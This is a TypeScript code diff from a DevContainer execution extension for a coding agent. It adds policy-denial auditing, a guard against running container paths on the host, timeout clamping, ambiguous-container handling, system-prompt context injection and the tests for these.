+      exitCode: result.exitCode,
+      outputTruncated: result.truncated,
+    }, request.containerId);
+    return result;
+  }
+
+  /**
+   * Frozen policy gate before target resolution or spawn.
+   *
+   * A DENIED attempt is itself an auditable event: policy probes (workspace,
+   * environment, destructive, host-exec) are recorded before the typed error is
+   * thrown, so denials are visible in the audit trail instead of silently
+   * absent. Denied environment VALUES are never recorded.
+   */
   private authorize(input: PolicyInput): OperationPolicySnapshot {
     const now = () => new Date(this.clock());
     const snapshot = evaluatePolicy(this.options.config, input, now);
     if (!snapshot.authorized) {
+      this.options.audit.write({
+        version: 1,
+        at: this.clock(),
+        operation: input.operation,
+        initiator: input.initiator,
+        ...(input.workspace !== undefined ? { workspace: input.workspace } : {}),
+        policyAuthorized: false,
+        ...(snapshot.denialReason !== undefined ? { policyDenialReason: snapshot.denialReason } : {}),
+        outputTruncated: false,
+        commandCapture: snapshot.effectiveConfig.audit.commandCapture,
+      });
       throw new RuntimeError({
         kind: "policy-denied",
         message: `Operation '${input.operation}' was denied: ${snapshot.denialReason ?? "policy"}.`,
@@ -4340,6 +4684,26 @@ export function hostToContainer(path: string, mapping: PathMapping | undefined):
   return undefined;
 }
 
+/**
+ * Return the first argv element that refers to a CONTAINER-only path (the
+ * workspace's container path or a path beneath it), or undefined.
+ *
+ * Used as a structured guard on the explicit HOST surface: host execution of
+ * literal argv involves no shell parsing, so this check is reliable — unlike
+ * any classifier over shell text. It catches the common mis-route of running a
+ * container path on the host (where it does not exist).
+ */
+export function findContainerPath(argv: readonly string[], containerPath: string): string | undefined {
+  const base = normalize(containerPath);
+  if (base.length === 0) return undefined;
+  for (const token of argv) {
+    if (typeof token !== "string" || !token.startsWith("/")) continue;
+    const candidate = normalize(token);
+    if (candidate === base || candidate.startsWith(`${base}/`)) return token;
+  }
+  return undefined;
+}
+
 function normalize(p: string): string {
   // Paths here are already absolute; just trim a trailing slash for prefix math.
   return p.length > 1 && p.endsWith("/") ? p.slice(0, -1) : p;
@@ -4497,12 +4861,13 @@ describe("NodeDevcontainerAdapter.exec", () => {
     ]);
   });
 
-  it("passes at most ONE --remote-env when multiple variables are requested (0.88.0 last-wins)", async () => {
+  it("forwards EVERY requested variable as a repeated --remote-env flag", async () => {
     const { runner, calls } = fakeRunner([{ ...ok(0), truncated: false }]);
     const adapter = makeAdapter(runner);
     await adapter.exec("/ws", "abc123", "echo", ["hi"], { remoteEnv: { A: "1", B: "2", C: "3" } });
-    const remoteEnvFlags = calls[0]!.args.filter((a) => a === "--remote-env");
-    expect(remoteEnvFlags).toHaveLength(1);
+    const argv = calls[0]!.args;
+    const envFlags = argv.reduce<string[]>((acc, token, index) => (token === "--remote-env" ? [...acc, argv[index + 1]!] : acc), []);
+    expect(envFlags).toEqual(["A=1", "B=2", "C=3"]);
   });
 
   it("carries the container-side exit code instead of throwing", async () => {
@@ -4614,7 +4979,7 @@ function makeConfig(overrides: Partial<EffectiveConfig> = {}): EffectiveConfig {
 
 function fakeTargetStore(snapshotStatus: string = "selected-valid"): { store: TargetStore; bound: ExecutionContext } {
   const ctx: ExecutionContext = {
-    workspaceKey: "ws-project-a",
+    workspaceKey: "/ws/project-a",
     candidateId: "abc123",
     candidateName: "project-a",
     boundAt: "2026-08-31T09:47:28.000Z",
@@ -4762,6 +5127,50 @@ describe("ExecutionService.exec", () => {
       service.lifecycle({ operation: "stop", initiator: "tool", workspace: "/ws/project-a", container, confirmation: undefined }),
     ).rejects.toMatchObject({ kind: "policy-denied" });
     expect(calls).toHaveLength(0);
+  });
+
+  it("audits a DENIED attempt before throwing", async () => {
+    const { adapter } = fakeDockerLifecycle();
+    const { service, audit } = makeService({ dockerLifecycle: adapter });
+    await expect(
+      service.lifecycle({ operation: "stop", initiator: "tool", workspace: "/ws/project-a", container, confirmation: undefined }),
+    ).rejects.toMatchObject({ kind: "policy-denied" });
+    const record = (audit.write as ReturnType<typeof vi.fn>).mock.calls.at(-1)![0] as AuditRecord;
+    expect(record.policyAuthorized).toBe(false);
+    expect(record.policyDenialReason).toBe("destructive-operation-disabled");
+  });
+
+  it("denies a request whose workspace is not the bound target workspace", async () => {
+    const { adapter, calls } = fakeDevcontainer([execOk]);
+    const { service } = makeService({ devcontainer: adapter });
+    await expect(
+      service.exec({ operation: "container-exec", initiator: "tool", workspace: "/ws/other", cmd: "ls", args: [] }),
+    ).rejects.toMatchObject({ kind: "policy-denied" });
+    expect(calls).toHaveLength(0);
+  });
+
+  it("sends the BOUND target workspace to the CLI, not the caller workspace", async () => {
+    const { adapter, calls } = fakeDevcontainer([execOk]);
+    const { service } = makeService({ devcontainer: adapter });
+    await service.exec({ operation: "container-exec", initiator: "tool", workspace: "/ws/project-a/sub", cmd: "ls", args: [] });
+    expect(calls[0]!.workspace).toBe("/ws/project-a");
+  });
+
+  it("audits an adapter failure for up instead of losing it", async () => {
+    const throwing: DevcontainerAdapter = {
+      up: vi.fn(async () => {
+        throw new RuntimeError({ kind: "daemon-unavailable", message: "no daemon" });
+      }),
+      build: vi.fn(),
+      exec: vi.fn(),
+    };
+    const { service, audit } = makeService({ devcontainer: throwing });
+    await expect(
+      service.up({ operation: "up", initiator: "slash-command", workspace: "/ws/project-a" }),
+    ).rejects.toMatchObject({ kind: "daemon-unavailable" });
+    const record = (audit.write as ReturnType<typeof vi.fn>).mock.calls.at(-1)![0] as AuditRecord;
+    expect(record.operation).toBe("up");
+    expect(record.errorSummary).toBe("no daemon");
   });
 
   it("carries a nonzero container-side exit in the outcome (never throws)", async () => {
@@ -4964,7 +5373,7 @@ import { NodeDockerAdapter } from "../src/runtime/docker-adapter.js";
 import { NodeDevcontainerAdapter } from "../src/runtime/devcontainer-adapter.js";
 import { NodeDockerLifecycleAdapter } from "../src/runtime/docker-lifecycle.js";
 import { buildWorkspaceRegistry, nodeTraversal, workspacePathFor } from "../src/runtime/host-discovery.js";
-import { buildPathMapping, hostToContainer, type PathMapping } from "../src/path-mapper.js";
+import { buildPathMapping, findContainerPath, hostToContainer, type PathMapping } from "../src/path-mapper.js";
 import { TargetStore } from "../src/target-store.js";
 import { ExecutionService } from "../src/execution-service.js";
 import { createRoutedBashOperations, type BashOperationsLike } from "../src/bash-router.js";
@@ -4979,11 +5388,13 @@ import {
   type ToolDefinitionLike,
 } from "../src/tools.js";
 import { createCommandHandlers, selectionFor, type CommandContextLike, type CommandServices } from "../src/commands.js";
+import { reconcileSelection } from "../src/commands.js";
 import { canonicalWorkspaceKey } from "../src/workspace-path.js";
 import { SELECTION_ENTRY_KIND, recoverLatestSelection, type SelectionRecord } from "../src/selection-state.js";
 import { evaluatePolicy, commandFingerprint } from "../src/policy.js";
 import type { EffectiveConfig } from "../src/types.js";
 import { RuntimeError } from "../src/errors.js";
+import { renderExecutionContext } from "../src/execution-context.js";
 
 /** Runtime composed once per session; re-composed on session reload. */
 interface Runtime {
@@ -4998,6 +5409,17 @@ interface Runtime {
     readonly hostExec: ToolDefinitionLike<unknown>;
   };
   readonly commandHandlers: ReturnType<typeof createCommandHandlers>;
+  /**
+   * Render the per-turn DevContainer execution-context block (host<->container
+   * mapping + surface guidance) appended to the system prompt, or undefined
+   * when there is no selected target/mapping to describe.
+   */
+  readonly executionContext: () => Promise<string | undefined>;
+  /**
+   * Re-resolve a persisted selection hint against the current registry and
+   * commit the result (used on session restore).
+   */
+  readonly reconcileSelection: (hint: { workspaceKey: string; candidateId?: string }) => Promise<void>;
 }
 
 function composeRuntime(config: EffectiveConfig, audit: JsonlAuditWriter, sessionWorkspace: string): Runtime {
@@ -5064,7 +5486,9 @@ function composeRuntime(config: EffectiveConfig, audit: JsonlAuditWriter, sessio
     const { entries } = await registry();
     const match = entries.find((e) => canonicalWorkspaceKey(e.workspacePath) === cwdKey);
     if (match === undefined) return;
-    await targetStore.select(selectionFor(match, match.containerId));
+    // Ambiguous (2+ running containers) must never be auto-picked by Docker
+    // order — selectionFor returns selected-ambiguous when no id is supplied.
+    await targetStore.select(selectionFor(match, match.ambiguous === true ? undefined : match.containerId));
   };
 
   /**
@@ -5136,18 +5560,78 @@ function composeRuntime(config: EffectiveConfig, audit: JsonlAuditWriter, sessio
           remedy: "Set hostExecution.allow=true in the global configuration to enable host escape.",
         });
       }
+      // Layer-3 guard: refuse host execution of an argv that targets a
+      // container-only path. Reliable because literal argv carries no shell
+      // syntax — this is the mis-route a text classifier could never catch
+      // safely. Covers BOTH devcontainer_host_exec and /devcontainer host-exec.
+      const selection = targetStore.snapshot();
+      if (selection.workspaceKey !== undefined) {
+        const { entries } = await registry();
+        const key = canonicalWorkspaceKey(selection.workspaceKey);
+        const entry = entries.find((e) => canonicalWorkspaceKey(e.workspacePath) === key);
+        const guardMapping =
+          entry !== undefined && entry.configPath.length > 0 ? readWorkspaceMapping(entry.configPath) : undefined;
+        const violation = guardMapping !== undefined ? findContainerPath(argv, guardMapping.containerPath) : undefined;
+        if (violation !== undefined) {
+          audit.write({
+            version: 1,
+            at: new Date().toISOString(),
+            operation: "host-exec",
+            initiator: "host-escape",
+            policyAuthorized: false,
+            policyDenialReason: "container-path-on-host",
+            outputTruncated: false,
+            commandCapture: config.audit.commandCapture,
+            ...hostCommandIdentity(argv, config.audit.commandCapture),
+          });
+          throw new RuntimeError({
+            kind: "policy-denied",
+            message: `Host command references container-only path ${violation}.`,
+            remedy: "Use devcontainer_exec or the bash tool for container paths; devcontainer_host_exec is for host paths.",
+          });
+        }
+      }
       const stdoutChunks: Buffer[] = [];
       const stderrChunks: Buffer[] = [];
       const startedAt = process.hrtime.bigint();
-      const result = await runner.exec(argv[0]!, [...argv.slice(1)], {
-        cwd: sessionWorkspace,
-        env: { ...env },
-        maxOutputBytes: config.maxOutputBytes,
-        onData: (chunk) => stdoutChunks.push(chunk),
-        onStderr: (chunk) => stderrChunks.push(chunk),
-        ...(options?.timeoutMs !== undefined ? { timeoutMs: options.timeoutMs } : {}),
-        ...(options?.signal !== undefined ? { signal: options.signal } : {}),
-      });
+      // Host execution is bounded by the same configured ceiling as the
+      // container path: an omitted/zero timeout defaults to maxTimeoutSeconds
+      // and a requested one is clamped to it, so an allowed host command can
+      // never run unbounded or exceed the operator's configured maximum.
+      const ceilingMs = config.maxTimeoutSeconds * 1000;
+      const requestedMs =
+        options?.timeoutMs !== undefined && Number.isFinite(options.timeoutMs) && options.timeoutMs > 0
+          ? options.timeoutMs
+          : ceilingMs;
+      const timeoutMs = Math.max(1, Math.min(requestedMs, ceilingMs));
+      let result: Awaited<ReturnType<typeof runner.exec>>;
+      try {
+        result = await runner.exec(argv[0]!, [...argv.slice(1)], {
+          cwd: sessionWorkspace,
+          env: { ...env },
+          maxOutputBytes: config.maxOutputBytes,
+          onData: (chunk) => stdoutChunks.push(chunk),
+          onStderr: (chunk) => stderrChunks.push(chunk),
+          timeoutMs,
+          ...(options?.signal !== undefined ? { signal: options.signal } : {}),
+        });
+      } catch (error) {
+        // A failed/timed-out host run is auditable too (spawn errors and
+        // timeouts reject before the success record below).
+        audit.write({
+          version: 1,
+          at: new Date().toISOString(),
+          operation: "host-exec",
+          initiator: "host-escape",
+          policyAuthorized: true,
+          durationMs: Number(process.hrtime.bigint() - startedAt) / 1e6,
+          outputTruncated: false,
+          commandCapture: config.audit.commandCapture,
+          ...hostCommandIdentity(argv, config.audit.commandCapture),
+          errorSummary: error instanceof Error ? error.message : String(error),
+        });
+        throw error;
+      }
       audit.write({
         version: 1,
         at: new Date().toISOString(),
@@ -5253,6 +5737,30 @@ function composeRuntime(config: EffectiveConfig, audit: JsonlAuditWriter, sessio
     }) as ToolDefinitionLike<unknown>,
   };
 
+  /**
+   * Render the execution-context block from the CURRENT selection + the
+   * workspace's devcontainer.json mapping. Recomputed per turn so a selection
+   * change or `/devcontainer up` is reflected immediately.
+   */
+  const executionContext = async (): Promise<string | undefined> => {
+    const snapshot = targetStore.snapshot();
+    if (snapshot.workspaceKey === undefined && snapshot.candidateId === undefined) return undefined;
+    let mapping: PathMapping | undefined;
+    if (snapshot.workspaceKey !== undefined) {
+      const { entries } = await registry();
+      const key = canonicalWorkspaceKey(snapshot.workspaceKey);
+      const entry = entries.find((e) => canonicalWorkspaceKey(e.workspacePath) === key);
+      if (entry !== undefined && entry.configPath.length > 0) {
+        mapping = readWorkspaceMapping(entry.configPath);
+      }
+    }
+    return renderExecutionContext({
+      ...(snapshot.candidateId !== undefined ? { candidateId: snapshot.candidateId } : {}),
+      status: snapshot.status,
+      ...(mapping !== undefined ? { mapping } : {}),
+    });
+  };
+
   return {
     config,
     targetStore,
@@ -5261,6 +5769,12 @@ function composeRuntime(config: EffectiveConfig, audit: JsonlAuditWriter, sessio
     hostRunner,
     tools,
     commandHandlers: createCommandHandlers(commandServices),
+    executionContext,
+    // One shared implementation for session restore and /devcontainer up.
+    // No persistence here: a restored selection is already stored.
+    reconcileSelection: async (hint) => {
+      await reconcileSelection(commandServices, {}, hint);
+    },
   };
 }
 
@@ -5306,7 +5820,15 @@ function readWorkspaceMapping(configPath: string): PathMapping | undefined {
   }
   let parsed: Record<string, unknown>;
   try {
-    parsed = JSON.parse(raw) as Record<string, unknown>;
+    // DevContainer configs are JSON with Comments in practice. Strip block
+    // comments, line comments (not inside strings) and trailing commas before
+    // parsing, so a commented config still yields its workspace mapping.
+    parsed = JSON.parse(
+      raw
+        .replace(/\/\*[\s\S]*?\*\//g, "")
+        .replace(/(^|[^:"'\\])\/\/.*$/gm, "$1")
+        .replace(/,\s*([}\]])/g, "$1"),
+    ) as Record<string, unknown>;
   } catch {
     return undefined;
   }
@@ -5360,7 +5882,13 @@ export default function (pi: ExtensionAPI): void {
     const paths = defaultConfigPaths(ctx.cwd);
     const base = loadConfig(paths, { projectTrusted: ctx.isProjectTrusted() });
     const config = composeRuntimeConfig(ctx.cwd, base);
-    const audit = new JsonlAuditWriter(defaultAuditDirectory(), config.audit.retentionDays);
+    // Honor audit.enabled and audit.directory: the configured directory is used
+    // when set, and `enabled: false` accepts records but persists nothing.
+    const audit = new JsonlAuditWriter(
+      config.audit.directory ?? defaultAuditDirectory(),
+      config.audit.retentionDays,
+      config.audit.enabled,
+    );
     runtime = composeRuntime(config, audit, ctx.cwd);
 
     // Register the devcontainer tools now that the runtime exists, so each
@@ -5372,17 +5900,53 @@ export default function (pi: ExtensionAPI): void {
 
     const recovered = restoreSelection(ctx);
     if (recovered !== undefined) {
-      await runtime.targetStore.select({
-        status: "selected-missing",
+      // Re-resolve against the live registry instead of parking the selection in
+      // `selected-missing` forever: a still-running target becomes usable again
+      // without a manual re-`use`.
+      await runtime.reconcileSelection({
         workspaceKey: recovered.workspaceKey,
-        detail: "Selection restored from session; refresh to re-resolve the target.",
+        ...(recovered.candidateId !== undefined ? { candidateId: recovered.candidateId } : {}),
       });
-      ctx.ui.notify(`Restored DevContainer selection ${recovered.workspaceKey}. Run /devcontainer list to refresh.`, "info");
+      const restoredStatus = runtime.targetStore.snapshot().status;
+      ctx.ui.notify(`Restored DevContainer selection ${recovered.workspaceKey} (${restoredStatus}).`, "info");
     }
   });
 
   pi.on("session_shutdown", async () => {
     runtime = undefined;
+  });
+
+  // --- Execution-context injection ---------------------------------------
+  // Append the current workspace's host<->container mapping and the execution
+  // surface guidance to the system prompt each turn. This is how the agent gets
+  // the FACTS it needs to choose the right surface (container by default; host
+  // only via the explicit devcontainer_host_exec), instead of the extension
+  // guessing an environment from command text.
+  pi.on("before_agent_start", async (event) => {
+    const rt = runtime;
+    if (rt === undefined) return undefined;
+    const block = await rt.executionContext();
+    if (block === undefined) return undefined;
+    return { systemPrompt: `${event.systemPrompt}\n\n${block}` };
+  });
+
+  // --- Non-routable execution surfaces ------------------------------------
+  // Pi's `tool_call` hook can BLOCK (and mutate input) but cannot re-route.
+  // While a DevContainer target is selected, the built-in `powershell` tool
+  // would spawn on the HOST — an execution surface this extension otherwise
+  // governs. Block it and point the agent at the routed surfaces instead.
+  // (`bash` is NOT touched here: it is our own overridden, container-routed
+  // tool.)
+  pi.on("tool_call", (event) => {
+    if (event.toolName !== "powershell") return undefined;
+    const rt = runtime;
+    if (rt === undefined) return undefined;
+    if (rt.targetStore.snapshot().status === "none") return undefined;
+    return {
+      block: true,
+      reason:
+        "PowerShell is not routed into the DevContainer. Use the `bash` tool or devcontainer_exec for container work, or devcontainer_host_exec for explicit host administration.",
+    };
   });
   // --- Commands ----------------------------------------------------------
 
@@ -6046,6 +6610,16 @@ export function selectionFor(
   candidateId: string | undefined,
 ): TargetSelection {
   const state = entry.containerState ?? "exited";
+  // More than one running container for this workspace: Docker result order
+  // must never decide the target. Fail closed until an explicit id is given.
+  if (entry.ambiguous === true && candidateId === undefined) {
+    const ids = (entry.containerCandidates ?? []).map((c) => c.id).join(", ");
+    return {
+      status: "selected-ambiguous",
+      workspaceKey: entry.workspacePath,
+      detail: `Multiple running containers for ${entry.workspacePath}${ids.length > 0 ? `: ${ids}` : ""}. Select one explicitly.`,
+    };
+  }
   const candidate = candidateId !== undefined
     ? {
         id: candidateId,
@@ -6063,11 +6637,58 @@ export function selectionFor(
   };
 }
 
+/**
+ * Re-resolve a selection hint against the CURRENT registry.
+ *
+ * Used by session restore and `/devcontainer up` so a persisted or config-only
+ * selection actually becomes usable instead of staying `selected-missing` /
+ * `selected-stopped` forever. Matching is by canonical workspace key; a
+ * persisted candidate id informs the choice but never overrides the ambiguity
+ * check — several running containers still fail closed.
+ */
+export async function reconcileSelection(
+  services: Pick<CommandServices, "targetStore" | "registry">,
+  ctx: Pick<CommandContextLike, "persistSelection">,
+  hint: { workspaceKey: string; candidateId?: string },
+): Promise<TargetSelection> {
+  const { entries } = await services.registry();
+  const key = canonicalWorkspaceKey(hint.workspaceKey);
+  const entry = entries.find((e) => canonicalWorkspaceKey(e.workspacePath) === key);
+  if (entry === undefined) {
+    const missing: TargetSelection = {
+      status: "selected-missing",
+      workspaceKey: hint.workspaceKey,
+      detail: "Selection restored from session; target not found. Run /devcontainer list.",
+    };
+    await services.targetStore.select(missing);
+    return missing;
+  }
+  const usableId = hint.candidateId !== undefined && entry.ambiguous !== true ? hint.candidateId : undefined;
+  const selection = selectionFor(entry, usableId);
+  await services.targetStore.select(selection);
+  if (selection.workspaceKey !== undefined) {
+    ctx.persistSelection?.({
+      version: SELECTION_PAYLOAD_VERSION,
+      workspaceKey: selection.workspaceKey,
+      ...(selection.candidate?.id !== undefined ? { candidateId: selection.candidate.id } : {}),
+      selectedAt: new Date().toISOString(),
+    });
+  }
+  return selection;
+}
+
 /** Namespaced command handler surface. */
 export function createCommandHandlers(services: CommandServices): Record<string, (args: string, ctx: CommandContextLike) => Promise<CommandResult>> {
   const handlers: Record<string, (args: string, ctx: CommandContextLike) => Promise<CommandResult>> = {};
 
-  handlers["list"] = async (_args, _ctx) => {
+  handlers["list"] = async (_args, ctx) => {
+    // `list` is the command the extension tells operators to run to refresh;
+    // actually re-resolve a stale/missing selection here so it repairs the
+    // target instead of only printing the registry.
+    const stale = services.targetStore.snapshot();
+    if (stale.status === "selected-missing" && stale.workspaceKey !== undefined) {
+      await reconcileSelection(services, ctx, { workspaceKey: stale.workspaceKey });
+    }
     const { entries } = await services.registry();
     const snapshot = services.targetStore.snapshot();
     return { text: renderStatus(snapshot, entries, services.config) };
@@ -6082,6 +6703,15 @@ export function createCommandHandlers(services: CommandServices): Record<string,
   handlers["use"] = async (args, ctx) => {
     const { entries } = await services.registry();
     const wanted = args.trim();
+    // An explicit CONTAINER id selects that candidate of an ambiguous workspace
+    // (the only way to resolve 2+ running containers for one workspace).
+    if (wanted.length > 0) {
+      const byCandidate = entries.find((e) => (e.containerCandidates ?? []).some((c) => c.id === wanted));
+      if (byCandidate !== undefined) {
+        await applySelection(services, selectionFor(byCandidate, wanted), ctx);
+        return { text: `Selected \`${byCandidate.workspacePath}\` → container \`${wanted}\`.` };
+      }
+    }
     let candidates = entries;
     if (wanted.length > 0) {
       candidates = entries.filter((e) => e.workspacePath.includes(wanted));
@@ -6092,18 +6722,24 @@ export function createCommandHandlers(services: CommandServices): Record<string,
       }
     }
     if (candidates.length === 1) {
-      const entry = candidates[0]!;
-      await applySelection(services, selectionFor(entry, entry.containerId), ctx);
-      return { text: `Selected \`${entry.workspacePath}\` (${entry.containerState ?? "config-only"}).\nRun /devcontainer up if it is not running.` };
+      const only = candidates[0]!;
+      if (only.ambiguous === true) {
+        const ids = (only.containerCandidates ?? []).map((c) => c.id);
+        return {
+          text: `[ambiguous-candidate] Multiple running containers for \`${only.workspacePath}\`${ids.length > 0 ? `: ${ids.map((id) => `\`${id}\``).join(", ")}` : ""}.\nRun /devcontainer use <container-id> to pick one.`,
+        };
+      }
+      await applySelection(services, selectionFor(only, only.containerId), ctx);
+      return { text: `Selected \`${only.workspacePath}\` (${only.containerState ?? "config-only"}).\nRun /devcontainer up if it is not running.` };
     }
     const labels = candidates.map((e) => `${e.workspacePath} [${e.containerState ?? "config-only"}]`);
     const choice = await ctx.ui.select("Select DevContainer target", labels, ctx.signal !== undefined ? { signal: ctx.signal } : undefined);
     if (choice === undefined) return { text: "Selection cancelled." };
     const idx = labels.indexOf(choice);
     if (idx === -1) return { text: "[unexpected] Unknown selection." };
-    const entry = candidates[idx]!;
-    await applySelection(services, selectionFor(entry, entry.containerId), ctx);
-    return { text: `Selected \`${entry.workspacePath}\` (${entry.containerState ?? "config-only"}).\nRun /devcontainer up if it is not running.` };
+    const picked = candidates[idx]!;
+    await applySelection(services, selectionFor(picked, picked.ambiguous === true ? undefined : picked.containerId), ctx);
+    return { text: `Selected \`${picked.workspacePath}\` (${picked.containerState ?? "config-only"}).\nRun /devcontainer up if it is not running.` };
   };
 
   handlers["up"] = async (args, ctx) => {
@@ -6115,7 +6751,17 @@ export function createCommandHandlers(services: CommandServices): Record<string,
       return { text: describeError(error) };
     }
     const id = outcome.candidateId !== undefined ? `\`${outcome.candidateId}\`` : "(no container id)";
-    return { text: `Up: ${outcome.workspaceKey} → ${id}\n${outcome.remoteUser !== undefined ? `remote user: ${outcome.remoteUser}\n` : ""}${outcome.remoteWorkspaceFolder !== undefined ? `remote folder: ${outcome.remoteWorkspaceFolder}` : ""}` };
+    // A successful `up` must make the selection usable: re-resolve it against
+    // the refreshed registry so exec does not fail with target-stopped right
+    // after a successful start (config-only / previously-missing selections).
+    let reconciled = "";
+    try {
+      const selection = await reconcileSelection(services, ctx, { workspaceKey: workspace });
+      reconciled = `\nselection: ${selection.status}`;
+    } catch (error) {
+      reconciled = `\nselection: (reconcile failed: ${error instanceof Error ? error.message : String(error)})`;
+    }
+    return { text: `Up: ${outcome.workspaceKey} → ${id}${reconciled}\n${outcome.remoteUser !== undefined ? `remote user: ${outcome.remoteUser}\n` : ""}${outcome.remoteWorkspaceFolder !== undefined ? `remote folder: ${outcome.remoteWorkspaceFolder}` : ""}` };
   };
 
   handlers["build"] = async (args, ctx) => {
@@ -6145,7 +6791,15 @@ export function createCommandHandlers(services: CommandServices): Record<string,
     }
     const tail = parseTail(args);
     try {
-      const result = await services.logs(container, { tail, ...(ctx.signal !== undefined ? { signal: ctx.signal } : {}) });
+      // Route logs through the shared service: policy-checked and audited like
+      // every other operation (it previously bypassed both).
+      const result = await services.execution.logs({
+        initiator: "slash-command",
+        workspace: snapshot.workspaceKey ?? ctx.cwd,
+        containerId: container.id,
+        tail,
+        ...(ctx.signal !== undefined ? { signal: ctx.signal } : {}),
+      });
       return { text: result.output.length > 0 ? result.output : `(no log output, exit ${result.exitCode})` };
     } catch (error) {
       return { text: describeError(error) };
@@ -6994,6 +7648,7 @@ function makeServices(overrides: Partial<CommandServices> = {}): CommandServices
       up: vi.fn(async (): Promise<UpBuildOutcome> => ({ operation: "up", workspaceKey: "/ws/project-a", candidateId: "up123", remoteUser: "vscode", policyAuthorized: true })),
       build: vi.fn(async (): Promise<UpBuildOutcome> => ({ operation: "build", workspaceKey: "/ws/project-a", imageName: "img:tag", policyAuthorized: true })),
       lifecycle: vi.fn(async (): Promise<LifecycleServiceResult> => ({ status: "done", action: "stop", containerId: "abc123456789" })),
+      logs: vi.fn(async () => ({ exitCode: 0, output: "log-line", truncated: false })),
     } as unknown as ExecutionService,
     registry: vi.fn(async () => ({ entries: [entry], diagnostics: [] })),
     refreshRegistry: vi.fn(async () => ({ entries: [entry], diagnostics: [] })),
@@ -7017,6 +7672,7 @@ function makeCtx(overrides: Partial<CommandContextLike> = {}): CommandContextLik
   };
   const ctx: CommandContextLike = {
     cwd: "/ws/project-a",
+    hasUI: true,
     ui,
     persistSelection: (record) => persisted.push(record),
     restoreSelection: () => undefined,
@@ -7193,22 +7849,37 @@ describe("/devcontainer stop + remove", () => {
     const result = await handlers["remove"]!("", ctx);
     expect(result.text).toContain("[confirmation-required]");
   });
+
+  it("refuses stop without an interactive UI (hasUI=false), never relying on confirm's silent default", async () => {
+    const { handlers, execution } = makeServices({
+      config: makeConfig({ destructive: { allowStop: true, allowRemove: false } }),
+    });
+    const ctx = makeCtx({ hasUI: false });
+    const result = await handlers["stop"]!("", ctx);
+    expect(result.text).toContain("[confirmation-required]");
+    expect(result.text).toContain("not available in this mode");
+    expect(ctx.ui.confirm).not.toHaveBeenCalled();
+    expect(execution.lifecycle).not.toHaveBeenCalled();
+  });
 });
 
 describe("/devcontainer logs", () => {
   it("resolves the current selection and returns bounded log output", async () => {
-    const { handlers, logs } = makeServices();
+    const { handlers, execution } = makeServices();
     const ctx = makeCtx();
     const result = await handlers["logs"]!("", ctx);
-    expect(logs).toHaveBeenCalledWith(container, { tail: 100 });
+    // Logs now go through the shared execution service (policy + audit).
+    expect(execution.logs).toHaveBeenCalledWith(
+      expect.objectContaining({ initiator: "slash-command", containerId: "abc123456789", tail: 100 }),
+    );
     expect(result.text).toBe("log-line");
   });
 
   it("parses --tail", async () => {
-    const { handlers, logs } = makeServices();
+    const { handlers, execution } = makeServices();
     const ctx = makeCtx();
     await handlers["logs"]!("--tail 25", ctx);
-    expect(logs).toHaveBeenCalledWith(container, { tail: 25 });
+    expect(execution.logs).toHaveBeenCalledWith(expect.objectContaining({ tail: 25 }));
   });
 
   it("returns a typed message when no target is resolvable", async () => {
@@ -7246,6 +7917,57 @@ describe("/devcontainer host-exec", () => {
     const ctx = makeCtx();
     await handlers["host-exec"]!("printf \"hello world\"", ctx);
     expect(hostRunner!.run).toHaveBeenCalledWith(["printf", "hello world"], undefined);
+  });
+});
+
+describe("/devcontainer setup", () => {
+  it("confirms then installs the Dev Containers CLI globally", async () => {
+    const setupCli = vi.fn(async () => ({ installed: true, version: "1.2.3" }));
+    const { handlers } = makeServices({ setupCli } as never);
+    const ctx = makeCtx();
+    const result = await handlers["setup"]!("", ctx);
+    expect(ctx.ui.confirm).toHaveBeenCalledWith(
+      "Install Dev Containers CLI",
+      expect.stringContaining("npm install -g @devcontainers/cli"),
+      undefined,
+    );
+    expect(setupCli).toHaveBeenCalledTimes(1);
+    expect(result.text).toContain("Dev Containers CLI ready: 1.2.3");
+  });
+
+  it("refuses without interactive UI (hasUI=false)", async () => {
+    const setupCli = vi.fn();
+    const { handlers } = makeServices({ setupCli } as never);
+    const ctx = makeCtx({ hasUI: false });
+    const result = await handlers["setup"]!("", ctx);
+    expect(result.text).toContain("[confirmation-required]");
+    expect(setupCli).not.toHaveBeenCalled();
+  });
+
+  it("cancels when the operator declines confirmation", async () => {
+    const setupCli = vi.fn();
+    const { handlers } = makeServices({ setupCli } as never);
+    const ctx = makeCtx();
+    ctx.ui.confirm.mockResolvedValueOnce(false);
+    const result = await handlers["setup"]!("", ctx);
+    expect(result.text).toBe("setup cancelled.");
+    expect(setupCli).not.toHaveBeenCalled();
+  });
+
+  it("reports install failure with the npm error", async () => {
+    const setupCli = vi.fn(async () => ({ installed: false, version: undefined, error: "EACCES permission denied" }));
+    const { handlers } = makeServices({ setupCli } as never);
+    const ctx = makeCtx();
+    const result = await handlers["setup"]!("", ctx);
+    expect(result.text).toContain("[setup-failed]");
+    expect(result.text).toContain("EACCES permission denied");
+  });
+
+  it("reports when setup is not wired", async () => {
+    const { handlers } = makeServices();
+    const ctx = makeCtx();
+    const result = await handlers["setup"]!("", ctx);
+    expect(result.text).toContain("[unexpected]");
   });
 });
 ```
@@ -8246,30 +8968,26 @@ console.log("[verify-package] all gates passed.");
  *
  *   1. Require a real `pi` CLI on PATH (`command -v pi`).
  *   2. `npm pack` the package into a tarball (real, not --dry-run), then
- *      install it into a throwaway Pi package store via `pi install <tarball>`
- *      (local path install per packages.md) OR, when `--no-install` is given,
- *      load the extension entrypoint directly with `--extension`.
- *   3. Boot `pi -p --print --no-session --offline` with the extension loaded
- *      and ask the model to enumerate its tools; assert the extension's tool
- *      names and the same-name `bash` override registration are visible.
- *   4. Confirm the extension's slash command (`/devcontainer list`) and the
- *      `user_bash` route (`!...`) are registered by driving a status-only
- *      request.
+ *      install it into a throwaway Pi package store via `pi install <tarball>`.
+ *   3. Extract the SAME tarball and assert the PACKED dist registers the tool,
+ *      command, and `user_bash` surfaces (never the checkout's dist).
+ *   4. Boot `pi -p --print --no-session --offline` with PI_CODING_AGENT_DIR
+ *      pointed at the scratch store, so the model turn actually loads the
+ *      packed extension, and assert its tools resolve with no extension error.
  *
- * This script requires a real model provider/API key: the Pi CLI answers the
- * prompt through the configured provider. In CI the `integration` workflow
- * installs `@devcontainers/cli` + runs this against a configured provider, or
- * it skips the model-touching steps with a named reason when the provider is
- * not configured (`PI_PROVIDER`/`PI_MODEL` unset or `--offline` without keys).
+ * This script requires a real model provider/API key for step 4. In CI the
+ * release workflow installs the real Pi CLI and runs this against a configured
+ * provider; when the provider is not configured the model step is skipped with
+ * a named reason (but the packed-artifact checks still run).
  *
- * Exit code: 0 = smoke passed (or all model steps skipped by named reason),
+ * Exit code: 0 = smoke passed (or model step skipped by named reason),
